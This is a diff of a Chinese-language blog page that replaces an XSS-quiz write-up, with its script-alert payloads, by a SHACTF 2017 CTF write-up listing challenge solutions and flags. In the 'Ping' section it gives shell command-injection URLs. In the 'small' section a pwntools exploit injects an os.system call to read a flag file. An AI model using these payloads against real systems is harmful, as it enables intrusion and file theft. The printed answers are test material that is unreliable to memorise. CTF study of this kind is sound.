@@ -71,7 +71,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="CTF,writeup,web,xss," />
+  <meta name="keywords" content="CTF,misc,writeup," />
 
 
 
@@ -89,18 +89,21 @@
 
 
 
-<meta name="description" content="xss-quiz： http://xss-quiz.int21h.jp/">
+<meta name="description" content="SHACTF-2017-Growing Up-writeup">
 <meta property="og:type" content="article">
-<meta property="og:title" content="xss-quiz-writeup">
-<meta property="og:url" content="http://yoursite.com/2017/06/25/xss-quiz-writeup/index.html">
+<meta property="og:title" content="SHACTF-2017-Growing Up-writeup">
+<meta property="og:url" content="http://yoursite.com/2017/08/06/SHACTF-2017-Growing-Up-writeup/index.html">
 <meta property="og:site_name" content="Chybeta">
-<meta property="og:description" content="xss-quiz： http://xss-quiz.int21h.jp/">
-<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170625/1.jpg?raw=true">
-<meta property="og:updated_time" content="2017-07-28T07:26:42.891Z">
+<meta property="og:description" content="SHACTF-2017-Growing Up-writeup">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/7.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/6.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/8.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/9.png?raw=true">
+<meta property="og:updated_time" content="2017-08-06T15:59:38.935Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="xss-quiz-writeup">
-<meta name="twitter:description" content="xss-quiz： http://xss-quiz.int21h.jp/">
-<meta name="twitter:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170625/1.jpg?raw=true">
+<meta name="twitter:title" content="SHACTF-2017-Growing Up-writeup">
+<meta name="twitter:description" content="SHACTF-2017-Growing Up-writeup">
+<meta name="twitter:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/7.png?raw=true">
 
 
 
@@ -128,13 +131,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/06/25/xss-quiz-writeup/"/>
+  <link rel="canonical" href="http://yoursite.com/2017/08/06/SHACTF-2017-Growing-Up-writeup/"/>
 
 
 
 
 
-  <title> xss-quiz-writeup | Chybeta </title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  <title> SHACTF-2017-Growing Up-writeup | Chybeta </title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -300,7 +303,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/25/xss-quiz-writeup/">
+  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/06/SHACTF-2017-Growing-Up-writeup/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="chybeta">
@@ -324,7 +327,7 @@
             
             
               
-                xss-quiz-writeup
+                SHACTF-2017-Growing Up-writeup
               
             
           </h1>
@@ -339,8 +342,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-06-25T19:25:11+08:00">
-                2017-06-25
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-08-06T23:15:37+08:00">
+                2017-08-06
               </time>
             
 
@@ -362,8 +365,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/writeup-Web/" itemprop="url" rel="index">
-                    <span itemprop="name">writeup:Web</span>
+                  <a href="/categories/writeup-MISC/" itemprop="url" rel="index">
+                    <span itemprop="name">writeup:MISC</span>
                   </a>
                 </span>
 
@@ -381,7 +384,7 @@
 
           
           
-             <span id="/2017/06/25/xss-quiz-writeup/" class="leancloud_visitors" data-flag-title="xss-quiz-writeup">
+             <span id="/2017/08/06/SHACTF-2017-Growing-Up-writeup/" class="leancloud_visitors" data-flag-title="SHACTF-2017-Growing Up-writeup">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -408,15 +411,45 @@
       
 
       
-        <p>xss-quiz： <a href="http://xss-quiz.int21h.jp/" target="_blank" rel="external">http://xss-quiz.int21h.jp/</a><br><a id="more"></a></p>
-<h1 id="Stage-1"><a href="#Stage-1" class="headerlink" title="Stage 1"></a>Stage 1</h1><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(document.domain)&lt;/script&gt;</div></pre></td></tr></table></figure></p>
-<h1 id="Stage-2"><a href="#Stage-2" class="headerlink" title="Stage 2"></a>Stage 2</h1><p><a href="http://xss-quiz.int21h.jp/stage2.php" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage2.php</a></p>
-<p>尝试如下payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(document.domain)&lt;/script&gt;</div></pre></td></tr></table></figure></p>
-<p>无反应，查看源代码：</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170625/1.jpg?raw=true" alt=""></p>
-<p>需要闭合前面value的双引号，所以最后payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&quot;</div></pre></td></tr></table></figure></p>
-<h1 id="Stage-3"><a href="#Stage-3" class="headerlink" title="Stage 3"></a>Stage 3</h1><p><a href="http://xss-quiz.int21h.jp/stage-3.php" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage-3.php</a></p>
-<p>多了一个选择country的功能。</p>
+        <p>SHACTF-2017-Growing Up-writeup<br><a id="more"></a></p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="All-about-the-Base-1"><a href="#All-about-the-Base-1" class="headerlink" title="All about the Base (1)"></a>All about the Base (1)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">We found this encoded message. Can you decode it?</div><div class="line">V2VsbCBkb25lLAoKdGhpcyBmaWxlIGlzIGVuY3J5cHRlZCB3aXRoIEJhc2U2NC4gT2Z0ZW4gdXNl</div><div class="line">ZCBpbiBDVEYncyB0byBkaXNwbGF5IGJpbmFyeSBkYXRhIGluIGEgbW9yZSBmcmllbmRseSB3YXku</div><div class="line">IAoKVGhlIGZsYWcgZm9yIHRoaXMgY2hhbGxlbmdlIGlzIGZsYWd7YjNlOWMzZWVlNjA5YmFjNDZm</div><div class="line">YWQ0NDM5Y2YzMjFmZTV9Cg==</div></pre></td></tr></table></figure>
+<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; import base64</div><div class="line">&gt;&gt;&gt; base64.b64decode(&quot;V2VsbCBkb25lLAoKdGhpcyBmaWxlIGlzIGVuY3J5cHRlZCB3aXRoIEJhc2U2NC4gT2Z0ZW4gdXNl ZCBpbiBDVEYncyB0byBkaXNwbGF5IGJpbmFyeSBkYXRhIGluIGEgbW9yZSBmcmllbmRseSB3YXku IAoKVGhlIGZsYWcgZm9yIHRoaXMgY2hhbGxlbmdlIGlzIGZsYWd7YjNlOWMzZWVlNjA5YmFjNDZm YWQ0NDM5Y2YzMjFmZTV9Cg==&quot;)</div><div class="line">&quot;Well done,\n\nthis file is encrypted with Base64. Often used in CTF&apos;s to display binary data in a more friendly way. \n\nThe flag for this challenge is flag&#123;b3e9c3eee609bac46fad4439cf321fe5&#125;\n&quot;</div></pre></td></tr></table></figure></p>
+<h2 id="Rotation-1"><a href="#Rotation-1" class="headerlink" title="Rotation (1)"></a>Rotation (1)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Seems someone rotated the alphabet, can you get the original message back?</div><div class="line">Ykksy eua ckxk ghrk zu mkz znk zkdz hgiq. Znk lrgm oy lrgm&#123;30j3g1gg0ijg9l08ijlg52668hi6854g&#125;</div></pre></td></tr></table></figure>
+<p>凯撒<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Seems you were able to get the text back. The flag is flag&#123;30d3a1aa0cda9f08cdfa52668bc6854a&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="Substitute-Teacher-2"><a href="#Substitute-Teacher-2" class="headerlink" title="Substitute Teacher (2)"></a>Substitute Teacher (2)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Hello, my name is Mr. Smith, I will be your substitute teacher for today. I only have one assignment for you today, if you solve it you may go home. Now be silence and solve it, so I can Netflix and chill!</div><div class="line">osvi cpm dprzsob ulsd hddsboeiou. iocpg gpaj njii usei. rihzi uli vrhdd tsulpau ehfsob h dpaow,</div><div class="line">s&apos;e so uli eswwri pn h oit iqsdpwi pn pjhobi sd uli oit mrhvf po oiunrsy. npj gpaj innpjud s lhzi</div><div class="line">h nrhb npj gpa: nrhb&#123;h230h7i624hnhv36291v5n31nh818w6n&#125;</div></pre></td></tr></table></figure>
+<p>词频分析一下，丢到这个网站 <a href="http://quipqiup.com/" target="_blank" rel="external">http://quipqiup.com/</a> ：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;a230a7e624afac36291c5f31fa818d6f&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="Exclusive-or-…-2"><a href="#Exclusive-or-…-2" class="headerlink" title="Exclusive or … (2)"></a>Exclusive or … (2)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">We found this strange text, can you get the original from it?</div></pre></td></tr></table></figure>
+<h2 id="Transposition-3"><a href="#Transposition-3" class="headerlink" title="Transposition (3)"></a>Transposition (3)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">We intercepted this secret message. We believe it is using a transposition cipher. Can you decipher it?</div><div class="line">Citgoe6b0 oohern636 nni.tg1e2 gssThe58e rschii366</div><div class="line">aohess3ae tlafcf3dc uvllhl24f lilaaa730 aneglg506 tgnfl&#123;33&#125;</div></pre></td></tr></table></figure>
+<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Deleted-File-3"><a href="#Deleted-File-3" class="headerlink" title="Deleted File (3)"></a>Deleted File (3)</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/7.png?raw=true" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG&#123;129F0A52F0F41E077E0FD03063FF4FAD&#125;</div></pre></td></tr></table></figure>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Zipfile-One-1"><a href="#Zipfile-One-1" class="headerlink" title="Zipfile One (1)"></a>Zipfile One (1)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">We received this zip file, but is asking for a password. All we know is that the password exists of 5 numbers, can you crack this password to get the hidden information?</div></pre></td></tr></table></figure>
+<p>给了压缩包，又说了是五个数字。爆破得密码为42831。flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;d6f56ae046bb241cc61f9d26f8e525d9&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="Zipfile-Two-2"><a href="#Zipfile-Two-2" class="headerlink" title="Zipfile Two (2)"></a>Zipfile Two (2)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">We received another zip file, which also requires a password. All we know is that the password is an existing English word with a length of 6 and all lowercase. Can you crack this password?</div></pre></td></tr></table></figure>
+<p>继续爆破，得密码为：future。得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;7128d78caf1e3297386a09afae0f8ea4&#125;</div></pre></td></tr></table></figure></p>
+<h1 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h1><h2 id="Download-1"><a href="#Download-1" class="headerlink" title="Download (1)"></a>Download (1)</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/6.png?raw=true" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG&#123;259F1B841EAAA4FCB843D77DCDADE55A&#125;</div></pre></td></tr></table></figure>
+<h2 id="Wanna-Buy-A-Flag-2"><a href="#Wanna-Buy-A-Flag-2" class="headerlink" title="Wanna Buy A Flag? (2)"></a>Wanna Buy A Flag? (2)</h2><p>打开后追踪TCP流，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;f08574923ec9c9ffb47188e6edc1a20f&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="Weird-Website-3"><a href="#Weird-Website-3" class="headerlink" title="Weird Website (3)"></a>Weird Website (3)</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/8.png?raw=true" alt=""></p>
+<p>导出页面后查看。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;8233daf526dcee25fd9ffda3bb99d677&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="Captured-Mail-4"><a href="#Captured-Mail-4" class="headerlink" title="Captured Mail (4)"></a>Captured Mail (4)</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/9.png?raw=true" alt=""></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> base64</div><div class="line">capturedmail = open(<span class="string">"capturedmail.zip"</span>,<span class="string">"wb"</span>)</div><div class="line"></div><div class="line">data = <span class="string">"UEsDBBQAAAAIAIy53UoyFb1+UwAAAFgAAAAIABwAZmxhZy50eHRVVAkAAzhtVVk4bVVZdXgLAAEE6AMAAAToAwAAFclLCoAgEADQfaeYA0QQMaOz7iSjjB8QBbVVdPdq+Xhnq7HLvIrM3OpYYSaFUCRCaP1DHuCTlKI1Knz4694dsrHGGELrxAuzV8JDAgVBJn225QVQSwECHgMUAAAACACMud1KMhW9flMAAABYAAAACAAYAAAAAAABAAAApIEAAAAAZmxhZy50eHRVVAUAAzhtVVl1eAsAAQToAwAABOgDAABQSwUGAAAAAAEAAQBOAAAAlQAAAAAA"</span></div><div class="line"></div><div class="line">capturedmail.write(base64.b64decode(data))</div><div class="line"></div><div class="line">capturedmail.close()</div></pre></td></tr></table></figure>
+<p>得到一个压缩包，解压后得到flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;1b5978777658baca99ce653af6fa596e&#125;</div></pre></td></tr></table></figure>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="In-Your-Head-1"><a href="#In-Your-Head-1" class="headerlink" title="In Your Head (1)"></a>In Your Head (1)</h2><p>地址：<a href="http://inyourhead.stillhackinganyway.nl/" target="_blank" rel="external">http://inyourhead.stillhackinganyway.nl/</a></p>
+<p>抓包看头部，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;a1a4d64086f713e92a809859d930d120&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="Old-School-2"><a href="#Old-School-2" class="headerlink" title="Old School (2)"></a>Old School (2)</h2><p>地址：<a href="http://oldschool.stillhackinganyway.nl/" target="_blank" rel="external">http://oldschool.stillhackinganyway.nl/</a><br>抓包修改User-Agent头：Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;f374df6554c7c6a6fced10396c84baf6&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="Broken-Image-2"><a href="#Broken-Image-2" class="headerlink" title="Broken Image (2)"></a>Broken Image (2)</h2><p>查看源代码，把base64串进行解密。得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;c0711614358a27110ca159302b106759&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="Location-3"><a href="#Location-3" class="headerlink" title="Location (3)"></a>Location (3)</h2><p>点进去后，每次访问一个新的页面，就记下页面的三个字母。等跳转完把字母拼接起来就行了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;f51cf5e7e1d003986acd2864139553a1&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="Ping-4"><a href="#Ping-4" class="headerlink" title="Ping (4)"></a>Ping (4)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ping.stillhackinganyway.nl/?ip=127.0.0.1|ls</div></pre></td></tr></table></figure>
+<p>知道有 s3cr3tfl4g.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ping.stillhackinganyway.nl/?ip=127.0.0.1|cat s3cr3tfl4g.txt</div></pre></td></tr></table></figure>
+<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;a8bb1ea55704762941ef519f98fff075&#125;</div></pre></td></tr></table></figure></p>
+<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="Find-The-Flag-1"><a href="#Find-The-Flag-1" class="headerlink" title="Find The Flag (1)"></a>Find The Flag (1)</h2><p>用IDA打开看一下就得到了flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;b760866fa6f035548be127b7525dbb66&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="Reverse-3"><a href="#Reverse-3" class="headerlink" title="Reverse (3)"></a>Reverse (3)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">We found this file on a server on the other side of the world, it looks weird, can you &quot;reverse&quot; it?</div></pre></td></tr></table></figure>
+<h1 id="Pwnable"><a href="#Pwnable" class="headerlink" title="Pwnable"></a>Pwnable</h1><h2 id="small-4"><a href="#small-4" class="headerlink" title="small (4)"></a>small (4)</h2><p>服务器端是python服务。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="keyword">print</span> <span class="string">"HACK "</span>*input(<span class="string">"Number: "</span>)</div></pre></td></tr></table></figure></p>
+<p>以下是exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">r = remote(<span class="string">"small.stillhackinganyway.nl"</span>,<span class="number">1337</span>)</div><div class="line"></div><div class="line">paylaod = <span class="string">"__import__('os').system('cat /home/small/flag')"</span></div><div class="line">r.sendline(paylaod)</div><div class="line"><span class="comment"># print(r.recv())</span></div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
+<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;69b5a247b9cd52ac97de7cc94994083e&#125;</div></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -429,12 +462,12 @@
   <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
   <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
   <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
-  <p><span>本文标题:</span><a href="/2017/06/25/xss-quiz-writeup/">xss-quiz-writeup</a></p>
+  <p><span>本文标题:</span><a href="/2017/08/06/SHACTF-2017-Growing-Up-writeup/">SHACTF-2017-Growing Up-writeup</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 chybeta 的个人博客">chybeta</a></p>
-  <p><span>发布时间:</span>2017年06月25日 - 19:06</p>
-  <p><span>最后更新:</span>2017年07月28日 - 15:07</p>
-  <p><span>原始链接:</span><a href="/2017/06/25/xss-quiz-writeup/" title="xss-quiz-writeup">http://yoursite.com/2017/06/25/xss-quiz-writeup/</a>
-    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2017/06/25/xss-quiz-writeup/"  aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2017年08月06日 - 23:08</p>
+  <p><span>最后更新:</span>2017年08月06日 - 23:08</p>
+  <p><span>原始链接:</span><a href="/2017/08/06/SHACTF-2017-Growing-Up-writeup/" title="SHACTF-2017-Growing Up-writeup">http://yoursite.com/2017/08/06/SHACTF-2017-Growing-Up-writeup/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2017/08/06/SHACTF-2017-Growing-Up-writeup/"  aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
 </div>
@@ -493,11 +526,9 @@
           
             <a href="/tags/CTF/" rel="tag"># CTF</a>
           
+            <a href="/tags/misc/" rel="tag"># misc</a>
+          
             <a href="/tags/writeup/" rel="tag"># writeup</a>
-          
-            <a href="/tags/web/" rel="tag"># web</a>
-          
-            <a href="/tags/xss/" rel="tag"># xss</a>
           
         </div>
       
@@ -506,8 +537,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/06/19/GCTF-web-writeup/" rel="next" title="GCTF-web-writeup">
-                <i class="fa fa-chevron-left"></i> GCTF-web-writeup
+              <a href="/2017/08/06/SHACTF-2017-Web-writeup/" rel="next" title="SHACTF-2017-Web-writeup">
+                <i class="fa fa-chevron-left"></i> SHACTF-2017-Web-writeup
               </a>
             
           </div>
@@ -516,8 +547,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/06/26/ROP学习：64位栈溢出/" rel="prev" title="ROP学习：64位栈溢出">
-                ROP学习：64位栈溢出 <i class="fa fa-chevron-right"></i>
+              <a href="/3017/06/19/ACM-OJ-长期更新/" rel="prev" title="ACM-OJ[长期更新]">
+                ACM-OJ[长期更新] <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -687,7 +718,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Stage-1"><span class="nav-number">1.</span> <span class="nav-text">Stage 1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Stage-2"><span class="nav-number">2.</span> <span class="nav-text">Stage 2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Stage-3"><span class="nav-number">3.</span> <span class="nav-text">Stage 3</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-number">1.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#All-about-the-Base-1"><span class="nav-number">1.1.</span> <span class="nav-text">All about the Base (1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Rotation-1"><span class="nav-number">1.2.</span> <span class="nav-text">Rotation (1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Substitute-Teacher-2"><span class="nav-number">1.3.</span> <span class="nav-text">Substitute Teacher (2)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exclusive-or-…-2"><span class="nav-number">1.4.</span> <span class="nav-text">Exclusive or … (2)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Transposition-3"><span class="nav-number">1.5.</span> <span class="nav-text">Transposition (3)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Forensics"><span class="nav-number">2.</span> <span class="nav-text">Forensics</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Deleted-File-3"><span class="nav-number">2.1.</span> <span class="nav-text">Deleted File (3)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Misc"><span class="nav-number">3.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Zipfile-One-1"><span class="nav-number">3.1.</span> <span class="nav-text">Zipfile One (1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Zipfile-Two-2"><span class="nav-number">3.2.</span> <span class="nav-text">Zipfile Two (2)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Network"><span class="nav-number">4.</span> <span class="nav-text">Network</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Download-1"><span class="nav-number">4.1.</span> <span class="nav-text">Download (1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Wanna-Buy-A-Flag-2"><span class="nav-number">4.2.</span> <span class="nav-text">Wanna Buy A Flag? (2)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Weird-Website-3"><span class="nav-number">4.3.</span> <span class="nav-text">Weird Website (3)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Captured-Mail-4"><span class="nav-number">4.4.</span> <span class="nav-text">Captured Mail (4)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web"><span class="nav-number">5.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#In-Your-Head-1"><span class="nav-number">5.1.</span> <span class="nav-text">In Your Head (1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Old-School-2"><span class="nav-number">5.2.</span> <span class="nav-text">Old School (2)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Broken-Image-2"><span class="nav-number">5.3.</span> <span class="nav-text">Broken Image (2)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Location-3"><span class="nav-number">5.4.</span> <span class="nav-text">Location (3)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ping-4"><span class="nav-number">5.5.</span> <span class="nav-text">Ping (4)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Re"><span class="nav-number">6.</span> <span class="nav-text">Re</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Find-The-Flag-1"><span class="nav-number">6.1.</span> <span class="nav-text">Find The Flag (1)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse-3"><span class="nav-number">6.2.</span> <span class="nav-text">Reverse (3)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwnable"><span class="nav-number">7.</span> <span class="nav-text">Pwnable</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#small-4"><span class="nav-number">7.1.</span> <span class="nav-text">small (4)</span></a></li></ol></li></ol></div>
             
 
           </div>
